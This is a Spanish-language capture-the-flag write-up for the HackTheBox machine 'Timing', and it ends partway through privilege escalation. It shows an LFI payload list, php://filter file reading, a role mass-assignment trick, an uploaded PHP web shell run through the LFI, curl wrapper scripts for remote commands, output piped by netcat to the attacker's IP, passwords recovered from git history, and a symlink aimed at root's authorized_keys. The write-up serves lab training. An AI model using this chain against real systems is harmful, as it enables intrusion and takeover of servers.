---
title: Timing WriteUp
date: 2023-06-30
categories: [WriteUps, Máquinas Linux]
tags: [LFI, Mass Assignment, Curl, authorized_keys]
image:
  path: ../../assets/img/writeups/Timing/timing.jpg
  width: 528
  height: 340
  alt: Banner Timing
---

Una de mis máquinas preferidas, está muy guapa!!.  
Realicé bastante enumeración e inspección de código a través de un LFI. Para agilizar creé unos scripts sencillos en bash. Mass Assignment no tan másiva, añado una línea correspondiente al role.
Subida de archivo malicioso para conseguir RCE. Juego con remote shell, también creo un script en bash con una estructura similiar a la anterior. Encuentro contraseña para el primer usuario.

Para la escalada tenemos el comando netutils con sudo. Me aprovecho de las llaves públicas, en concreto del authorized keys.

## Reconocimiento

Hoy pentestearemos la máquina Timing de HackTheBox con ip `10.10.11.135`. Lo primero es comprobar que tenemos conectividad con esa ip (tendrás que conectarte a la vpn de la plataforma antes).
```
❯ ping -c 1 10.10.11.135
PING 10.10.11.135 (10.10.11.135) 56(84) bytes of data.
64 bytes from 10.10.11.135: icmp_seq=1 ttl=63 time=50.3 ms

--- 10.10.11.135 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 50.327/50.327/50.327/0.000 ms
```
Un paquete envíado, un paquete recibido.

Escaneamos los puertos de la máquina objetivo:
```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.135 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-26 09:41 CEST
Initiating SYN Stealth Scan at 09:41
Scanning 10.10.11.135 [65535 ports]
Discovered open port 80/tcp on 10.10.11.135
Discovered open port 22/tcp on 10.10.11.135
Completed SYN Stealth Scan at 09:41, 12.02s elapsed (65535 total ports)
Nmap scan report for 10.10.11.135
Host is up, received user-set (0.044s latency).
Scanned at 2023-06-26 09:41:42 CEST for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.135 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Tenemos los puertos 22/ssh y 80/http abiertos. Realizaré otro escaneo lanzando una serie de scrips básicos sobre esos puertos localizados:
```sh
❯ nmap -p22,80 -sC -sV 10.10.11.135 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-26 09:44 CEST
Nmap scan report for 10.10.11.135
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Simple WebApp
|_Requested resource was ./login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Buscando vulnerabilidades

Empecemos por el puerto 80 y usemos la herramienta whatweb desde consola para ver las tecnologías que corren por detrás del servicio web:
```
❯ whatweb http://10.10.11.135
http://10.10.11.135 [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.135], RedirectLocation[./login.php]
http://10.10.11.135/login.php [200 OK] Apache[2.4.29], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[#,dkstudioin@gmail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.135], JQuery, Script, Title[Simple WebApp]
```
Te redirige a login.php. Tenemos un correo y sabemos que la web interpreta php dado ese login.php. Podríamos forzar a que no rediriga a login.php mediante burpsuite:  
Paso la petición por burpsuite --> click derecho y "response to this request" --> forward --> Ahora verás la respuesta, cambias el 302 Found por 200 OK --> Forward --> Si vuelves al navegador no verás contenido, así que nada.

Esta pinta tiene la página de login.php:

![Web]({{ 'assets/img/writeups/Timing/web.png' | relative_url }}){: .center-image }

Abajo tiene alguna cosilla más, pero todas redirigen a la misma página login.php.

Al probar a logearnos con un usuario cualquiera, en mi caso probe admin:admin nos muestra que el "usuario o contraseña es inválido" con lo que parece no dar pistas si un usuario es válido, y lo interesante es que en la url se muestra un parámetro.


En el valor del parámetro podría probar algunas inyecciones o ataques LFI. Mando estas en el lugar de true:
```
/etc/passwd
file:///etc/passwd
../../../../../../../../etc/passwd
....//....//....//....//....//....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=/etc/passwd
..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
php://filter/resource=/etc/passwd
/etc/passwd%00
../../../../../../../etc/passwd%00
```
Pero todas me dan la misma respuesta. Normalmente me fijo en el Content-Lenght, si es el mismo tamaño de respuesta es que no funciona.  
Lanzo un ataque de fuerza bruta con ffuf por posibles LFI:
```sh
❯ ffuf -c -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://10.10.11.135/login.php?login=FUZZ' -fs 5963 -p 0.5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.135/login.php?login=FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Delay            : 0.20 seconds
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 5963
________________________________________________

:: Progress: [920/920] :: Job [1/1] :: 157 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```
Opciones:  
-c: coloreado.  
-w: diccionario.  
-fs : oculta el size que le pongas.  
-p: tiempo de delay entre petición. Para que vaya menos rápido y se asegure bien.

No encuentra nada tampoco.

Fuzzeo por parámetros:
```sh
❯ ffuf -c -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://10.10.11.135/login.php?FUZZ=true' -fs 5609 -p 0.5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.135/login.php?FUZZ=true
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Delay            : 0.50 seconds
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 5609
________________________________________________

login                   [Status: 200, Size: 5963, Words: 1878, Lines: 188, Duration: 44ms]
```
Encuentra el parámetro que ya sabemos; login.

Realizaré un fuzzing de subdirectorios y archivos php ya que sé que la web los interpreta:
```sh
❯ gobuster dir -u http://10.10.11.135 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 50

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.135
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/06/26 11:28:46 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.135/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]                  
/login.php            (Status: 200) [Size: 5609]                                 
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]                  
/image.php            (Status: 200) [Size: 0]                                    
/header.php           (Status: 302) [Size: 0] [--> ./login.php]                  
/footer.php           (Status: 200) [Size: 3937]                                 
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]                  
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.135/css/]   
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.135/js/]    
/logout.php           (Status: 302) [Size: 0] [--> ./login.php]                  
Progress: 88866 / 441122 (20.15%)                                     
```
footer.php es el php de la parte de abajo de la web, nada interesante me parece. El resto de directorios me responden "Forbidden" no tengo privilegios para verlos.  
Hay que mirar bien, si nos metemos a **image.php** parece que se quiere interpretar pero sale vacio, quizás este esperando algún parametro, fuzzearemos buscando un parametro en este php, con la herramienta wfuzz esta vez:
```sh
❯ wfuzz -c --hw=0 -t 100 -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "http://10.10.11.135/image.php?FUZZ=/etc/passwd"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.135/image.php?FUZZ=/etc/passwd
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000002803:   200        0 L      3 W        25 Ch       "img"                                                                                                                  

Total time: 13.38524
Processed Requests: 6453
Filtered Requests: 6452
Requests/sec.: 482.0980
```
Encontramos que el parámetro img devuelve algo. Puedes verlo por navegador pero me apetece mostrarlo con curl:
```bash
❯ curl -s -X GET "http://10.10.11.135/image.php?img=/etc/passwd" | html2text
Hacking attempt detected!
```
De nuevo podríamos probar un ataque LFI, usaré mi mini diccionario.
```bash
❯ wfuzz -c -w /home/guise/Herramientas/miniLFI.txt "http://10.10.11.135/image.php?img=FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.135/image.php?img=FUZZ
Total requests: 9

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000008:   200        0 L      3 W        25 Ch       "/etc/passwd%00"                                                                                                       
000000001:   200        0 L      3 W        25 Ch       "/etc/passwd"                                                                                                          
000000003:   200        0 L      3 W        25 Ch       "../../../../../../../../etc/passwd"                                                                                   
000000007:   200        31 L     40 W       1614 Ch     "php://filter/resource=/etc/passwd"                                                                                    
000000005:   200        0 L      1 W        2152 Ch     "php://filter/convert.base64-encode/resource=/etc/passwd"                                                              
000000002:   200        0 L      3 W        25 Ch       "file:///etc/passwd"                                                                                                   
000000006:   200        0 L      0 W        0 Ch        "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"                                                             
000000009:   200        0 L      3 W        25 Ch       "../../../../../../../etc/passwd%00"                                                                                   
000000004:   200        0 L      3 W        25 Ch       "....//....//....//....//....//....//....//etc/passwd"
```
Todas responden 25 caracteres menos dos inyecciones:  
1. php://filter/resource=/etc/passwd
2. php://filter/convert.base64-encode/resource=/etc/passwd

De la primera forma te devuelve la data de una, en la  segunda inyección te devuelve la data en base 64 así que la decodeamos:
```bash
❯ curl -s -X GET "http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```
Tenemos el usuario aaron. Intento sacar su id_rsa pero no funciona.

Probando el usuario aaron en la web con contraseña aaron accedemos.

![DentroWeb]({{ 'assets/img/writeups/Timing/dentroWeb.png' | relative_url }}){: .center-image }

Somos el user 2, puede que el user 1 sea el administrador.

Voy a crear un script en bash para enumerar más cómodamente los archivos de la máquina objetivo. Lo llamo rce.sh:
```bash
#!/bin/bash
 
function ctrl_c(){
    echo -e "\n Saliendo..\n"
    exit 1
}
# Ctrl+C
trap ctrl_c INT
 
if [ $# -eq 0 ]; then
 
    >&2 echo -e "\n No has proporcionado argumento, por favor proporciona archivo a listar..\n"
 
    exit 1
 
fi

curl -s -X GET "http://10.10.11.135/image.php?img=php://filter/resource=$1"
```
Bien, voy a listar todos los php sacados con gobuster, esta herramienta tiene la opción -o para exportar a un fichero la data. La exporté con el nombre gobusterDirectory y luego:
```bash
❯ cat gobusterDirectory | awk '{print $1}' > alistar.txt

❯ cat alistar.txt
───────┬─────────────────────────────────────────────────
       │ File: alistar.txt
───────┼─────────────────────────────────────────────────
   1   │ /profile.php
   2   │ /image.php
   3   │ /header.php
   4   │ /login.php
   5   │ /footer.php
   6   │ /upload.php
   7   │ /images
   8   │ /index.php
   9   │ /css
  10   │ /js
  11   │ /logout.php
```
Voy a crear un directorio para ir guardando el código de todas. Peeero si quiero listar los php no me lo saca con esa inyección en el curl del rce.sh creado, tendré que recurrir al segundo, modifico el script:
```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n Saliendo..\n"
	exit 1
}

# Ctrl+C
trap ctrl_c INT

if [ $# -eq 0 ]; then

    >&2 echo -e "\n No has proporcionado argumento, por favor proporciona archivo a listar..\n"

    exit 1

fi


curl -s -X GET "http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=$1" | base64 -d > $1
```
Y ahora voy sacando uno a uno los archivos php encontrados que se guardarán directamente en el directorio. Podría haber hehco un bucle que pasará la lista de archivos peeeero lo dejo así:
```bash
❯ ./rce.sh profile.php
❯ ./rce.sh image.php
❯ ./rce.sh login.php
❯ ./rce.sh upload.php
❯ ./rce.sh index.php

❯ ls
total 28K
-rw-r--r-- 1 root root  111 jun 27 10:17 alistar.txt
-rw-r--r-- 1 root root  507 jun 27 10:55 image.php
-rw-r--r-- 1 root root  188 jun 27 10:56 index.php
-rw-r--r-- 1 root root 2,1K jun 27 10:56 login.php
-rw-r--r-- 1 root root 3,0K jun 27 10:30 profile.php
-rwxr-xr-x 1 root root  349 jun 27 10:28 rce.sh
-rw-r--r-- 1 root root 1018 jun 27 10:56 upload.php
```
## Inspeccionando el código

Toca inspeccionar el código. Así funcionaba el image.php:
```php
<?php

function is_safe_include($text)
{
    $blacklist = array("php://input", "phar://", "zip://", "ftp://", "file://", "http://", "data://", "expect://", "https://", "../");

    foreach ($blacklist as $item) {
        if (strpos($text, $item) !== false) {
            return false;
        }
    }
    return substr($text, 0, 1) !== "/";

}

if (isset($_GET['img'])) {
    if (is_safe_include($_GET['img'])) {
        include($_GET['img']);
    } else {
        echo "Hacking attempt detected!";
    }
}
```

Y con el index.php deduzco que ese "2" en "You are logged in as user 2!" cuando me logeo con aaron lo saca del campo userid:
```php
<?php
include_once "header.php";
?>

<h1 class="text-center" style="padding: 200px">You are logged in as user <?php echo $_SESSION['userid']; ?>!</h1>

<?php
include_once "footer.php";
?>
```
Si puedieramos cambiarlo a 1 estaría guay.  
En login.php encuentro este otro archivo db_conn.php.
```bash
> ./rce.sh db_conn.php
> cat db_conn.php
```
```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```
Pruebo esas credenciales para conectarme por ssh y por el panel de usuario tanto con el usuario root como con el usuario aaron pero nada.

En profile.php encuentro js/profile.js:
```js
function updateProfile() {
    var xml = new XMLHttpRequest();
    xml.onreadystatechange = function () {
        if (xml.readyState == 4 && xml.status == 200) {
            document.getElementById("alert-profile-update").style.display = "block"
        }
    };

    xml.open("POST", "profile_update.php", true);
    xml.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xml.send("firstName=" + document.getElementById("firstName").value + "&lastName=" + document.getElementById("lastName").value + "&email=" + document.getElementById("email").value + "&company=" + document.getElementById("company").value);
}
```
Y en este js encontramos el archivo **profile_update.php**, aquí esta la clave para intentar cambiarnos el rol de 2 a 1:
```php
<?php

include "auth_check.php";

$error = "";

if (empty($_POST['firstName'])) {
    $error = 'First Name is required.';
} else if (empty($_POST['lastName'])) {
    $error = 'Last Name is required.';
} else if (empty($_POST['email'])) {
    $error = 'Email is required.';
} else if (empty($_POST['company'])) {
    $error = 'Company is required.';
}

if (!empty($error)) {
    die("Error updating profile, reason: " . $error);
} else {

    include "db_conn.php";

    $id = $_SESSION['userid'];
    $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $result = $statement->execute(array('id' => $id));
    $user = $statement->fetch();

    if ($user !== false) {

        ini_set('display_errors', '1');
        ini_set('display_startup_errors', '1');
        error_reporting(E_ALL);

        $firstName = $_POST['firstName'];
        $lastName = $_POST['lastName'];
        $email = $_POST['email'];
        $company = $_POST['company'];
        $role = $user['role'];

        if (isset($_POST['role'])) {
            $role = $_POST['role'];
            $_SESSION['role'] = $role;
        }
y sigue un poco más...
```
Parece que este recurso requiere unos campos y además en la última parte de código que vemos arriba sale el campo "rol", y dice que si está role como campo que se lo asignes. Voy a meterme a profile_update.php por navegador e interceparé la petición con burpsuite para añadir los campos.

Antes de actualizarlo con el profile_update igual hay que crear uno en profile.php

![Profile]({{ 'assets/img/writeups/Timing/profile.png' | relative_url }}){: .center-image }

Ahora si que intercepto la petición de profile_update añado los campos necesarios, de momento el campo role no, pero me da error(fallaba porque no había hecho "change method"). Si lo hago con curl funciona:
```sh
> curl -s -X POST "http://10.10.11.135/profile_update.php" -d 'firstName=test&lastName=test&email=test&company=test' -b "PHPSESSID=beeq6og0i05ojqq1flitjn6ske"

{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "test",
    "3": "test",
    "firstName": "test",
    "4": "test",
    "email": "test",
    "5": "test",
    "role": "0",
    "6": "0",
    "company": "test",
    "7": "test"
}
```
Tiene pinta que hemos volcado los objetos de ese usuario, incluidos los campos que nos obligatorios editar. Vemos el del "role" también.

Bien, ahora si que por burpsuite pasando la petición de carga del fichero profile_update.php hago click derecho --> change method --> añado de data:  
firstName=test&lastName=test&email=test&company=test&role=1  
--> Forward --> intercept its off --> vuelvo al navegador.  
Veré lo mismo que en curl, pero si ahora me voy a la página principal se ha añadido la sección "Admin panel", así que deduzco que ahora mismo soy el administrador de la web.

![AdminPanel]({{ 'assets/img/writeups/Timing/adminPanel.png' | relative_url }}){: .center-image }

Tiene pinta que puedo subir archivos. Como puedo leer código me aprovecho para conseguir este php:
```bash
> ./rce.sh avatar_uploader.php
```
No veo nada interesante. El que lo gestiona debe ser upload.php. Muestro la parte importante del código:
```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
``` 
Más abajo señala que debe acabar como .jpg. Como lo podemos llamar desde el LFI y este se llama dentro de un php puede que ese jpg también lo interprete como php a pesar de su extensión de imagen.

La función uniqid() hubiera sido buena idea si no estuviera entre comillas, ya que solo hará un md5 de la cadena $file_hash, en cuanto al time te saca el tiempo actual en formato epoch, podemos averiguarlo gracias a la respuestas de las cabezeras del burpsuite.

Creo un pwn.jpg para subirlo:
```
<?php system($_REQUEST['cmd']); ?>
```
Intercepto la petición en el "Upload Image". Lo mando al "repeater" --> intercept is off (no es necesario pero lo hago) --> Envíaremos y nos quedaremos con la cabecera del tiempo.

![ArchivoSubido]({{ 'assets/img/writeups/Timing/archivoSubido.png' | relative_url }}){: .center-image }

Ahora desde la terminal se puede calcular el epoch del tiempo.
```bash
> php -a
# Entraríamos al modo interactivo de php

php > $vartime = "Wed, 28 Jun 2023 15:07:34 GMT";
php > echo strtotime($vartime);
1687964854
# Y así se calcula el epoch de el tiempo actual de la subida

php > echo md5('$file_hash' . strtotime($vartime)) . '_pwn.jpg';
155ebe85f13f2d92fad1856279bcdeee_pwn.jpg
# Así se llamaría el archivo subido
```
```bash
> curl -s -X GET "http://10.10.11.135/images/uploads/155ebe85f13f2d92fad1856279bcdeee_pwn.jpg"
<?php system($_REQUEST['cmd']); ?>
```
El archivo está!!!!. Si intentar el rce desde este punto fallaría, mira;
```bash
> curl -s -X GET "http://10.10.11.135/images/uploads/155ebe85f13f2d92fad1856279bcdeee_pwn.jpg" --data-urlencode "cmd=id"
<?php system($_REQUEST['cmd']); ?>
```
Llmandolo con extensión jpg no se debería interpretar, pero como lo llamaré desde otro php -image.php- igual si funciona.
```bash
> curl -s -X GET "http://10.10.11.135/image.php?img=images/uploads/155ebe85f13f2d92fad1856279bcdeee_pwn.jpg&cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

> curl -s -X GET -G "http://10.10.11.135/image.php?img=images/uploads/155ebe85f13f2d92fad1856279bcdeee_pwn.jpg" --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Realizado de dos maneras, curl es la ostia
```
Tenemos RCE. Probemos si hay conexión con nuestra máquina para poder luego lanzarnos una reverse shell. Me pongo en escucha desde mi consola:
```bash
> tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
Desde otra consola realizo el ping:
```sh
> curl -s -X GET -G "http://10.10.11.135/image.php?img=images/uploads/155ebe85f13f2d92fad1856279bcdeee_pwn.jpg" --data-urlencode "cmd=ping -c 1 10.10.14.8"
PING 10.10.14.8 (10.10.14.8) 56(84) bytes of data.
From 10.10.11.135 icmp_seq=1 Destination Port Unreachable

--- 10.10.14.8 ping statistics ---
1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms
```
No hay conectividad. Voy a crearme un script como antes para agilizar el RCE -una remote shell-. Lo llamo rce2.sh:
```sh
#!/bin/bash

function ctrl_c(){
    echo -e "\n Saliendo..\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

if [ $# -eq 0 ]; then

    >&2 echo -e "\n No has proporcionado argumento, por favor proporciona archivo a listar..\n"

    exit 1

fi

curl -s -X GET -G "http://10.10.11.135/image.php?img=images/uploads/155ebe85f13f2d92fad1856279bcdeee_pwn.jpg" --data-urlencode "cmd=$1"

```
Y ya podemos lanzar comandos más cómodamente.
```sh
> ./rce2.sh id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Probando por netcat parece que si recibo señal:
```sh
> ./rce2.sh whoami | nc 10.10.14.8 443
```
```sh
> nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.14.8] 34802
www-data
```
Me intento lanzar varías reverse pero no funcionan. Inspeccionando un poco bastante la máquina objetivo se puede encontrar esto:
```sh
> ./rce2.sh "ls -l /opt"
total 616
-rw-r--r-- 1 root root 627851 Jul 20  2021 source-files-backup.zip

> ./rce2.sh "cat /opt/source-files-backup.zip" > backup.zip
> ls backup.zip
-rw-r--r-- 1 root root 614K jun 28 18:04 backup.zip

# Para comprobar la integridad del archivo le haré un md5sum:
> md5sum backup.zip
7fd8d13ab49b661b4d484f809a217810  backup.zip
> ./rce2.sh "md5sum /opt/source-files-backup.zip"
7fd8d13ab49b661b4d484f809a217810  /opt/source-files-backup.zip

# También podríamos haber mandado el archivo al directorio web para tener acceso desde navegador:
> ./rce2.sh pwd
/var/www/html
> ./rce2.sh "mv /opt/source-files-backup.zip /var/www/html"
# Podríamos acceder fácil al .zip desde el navegador para descargarlo.
```
Ya tenemos el backup.zip en nuestra máquina local:
```sh
> mkdir backup
> unzip backup.zip
# Encontramos los recursos que ya teníamos de la web. Pero además hay un directorio .git:
```
Siempre que veas un recurso .git puedes hacer esto:
```sh
> git log  # Te muestra los diferenes logs del proyecto

commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

commit e4e214696159a25c69812571c8214d2bf8736a3f
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:33:54 2021 +0000

> git show 16de2698b5b122c93461298eab730d00273bd83e
# Te muestra algo de contenido y las variaciones acontecidas.

commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');

```
Encontramos otra password. La que se añadió ya la tenemos y no conseguimos acceder con ella ni por ssh ni al panel web. Probemos con la contraseña; **S3cr3t_unGu3ss4bl3_p422w0Rd**
```sh
> ssh aaron@10.10.11.135
...[snip]....

aaron@timing:~$ export TERM=xterm
aaron@timing:~$ whoami
aaron
```
Y estamos dentro ueueueueu!!! Pillemos la flag de usuario:
```sh
aaron@timing:~$ cat user.txt
29859561d420bf004d5b*******
```

## Escalada de privilegios

```sh
> sudo -l 

Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
# Tenemos privilegio de sudo con netutils

aaron@timing:~$ sudo -u root netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> http://10.10.14.8/test.txt
Initializing download: http://10.10.14.8/test.txt
File size: 20 bytes
Opening output file test.txt
Server unsupported, starting from scratch with one connection.
Starting download

aaron@timing:~$ ls -l
total 8
-rw-r--r-- 1 root root  20 Jun 28 17:21 test.txt
-rw-r----- 1 root aaron 33 Jun 28 14:09 user.txt
aaron@timing:~$ cat test.txt
que paxaaaaa broooo
```
Parece que podemos crearnos cualquier archivo como root, es decir, el propietario será root. ¿Qué podríamos hacer?. Jugaré con llaves públicas, con authorized_keys:
```sh
aaron@timing:~$ ln -s -f /root/.ssh/authorized_keys id_rsa.pub
# Estoy creando un enlace simbólico. Enlazo el authorized_keys con un archivo que llamare id_rsa.pub
# Todo lo que se modifique en uno se modificará en el otro siempre que tenga el privilegio de cambiarlo.

aaron@timing:~$ ls -l
total 8
lrwxrwxrwx 1 aaron aaron 26 Jun 28 17:29 id_rsa.pub -> /root/.ssh/authorized_keys
